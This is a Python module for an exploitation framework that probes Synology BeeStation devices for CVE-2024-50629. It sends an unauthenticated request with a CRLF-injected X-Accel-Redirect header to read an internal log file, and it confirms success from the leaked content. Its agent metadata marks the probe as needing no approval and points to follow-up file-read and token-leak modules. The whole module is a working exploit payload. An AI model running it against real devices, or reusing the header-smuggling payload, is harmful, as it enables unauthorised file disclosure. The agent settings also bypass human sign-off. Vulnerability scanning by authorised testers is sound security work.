#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synology BeeStation (BSM) file disclosure via X-Accel-Redirect (Synology-SA-24:23)."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synology BeeStation (BSM) - File Disclosure (CVE-2024-50629 / SA-24:23)',
        'description': (
            'Synology BeeStation OS allows unauthenticated file disclosure via webapi '
            'SYNO.API.Auth.RedirectURI CRLF/X-Accel-Redirect injection. Detection of '
            'CVE-2024-50629 also indicates exposure to SA-24:23 issues (CVE-2024-10441, '
            'CVE-2024-10445).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'synology', 'beestation', 'bsm',
            'lfi', 'exposure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/synology_cve_2024_50629_file_read', 'auxiliary/admin/http/synology_cve_2024_50630_token_leak'],
            },
        },
        'references': [
            'https://www.synology.com/en-global/security/advisory/Synology_SA_24_23',
            'https://www.zerodayinitiative.com/advisories/ZDI-25-211/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-50629',
        ],
        'cve': 'CVE-2024-50629',
    }

    def run(self):
        path = '/webapi/entry.cgi'
        data = (
            'api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url='
            'https://dsfinder.synology.com/dsm/login?\r\n'
            'X-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log'
        )
        r = self.http_request(
            method='POST',
            path=path,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        log_marker = re.search(
            r'^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\].+\.(o|cpp)',
            body,
            re.MULTILINE,
        )
        if (
            'checkpoint-task.cpp.o' in body
            or 'job-queue-client.cpp.o' in body
            or log_marker
        ):
            self.set_info(
                severity='critical',
                reason='Synology BeeStation SA-24:23 / CVE-2024-50629 file disclosure',
                path=path,
            )
            return True
        return False
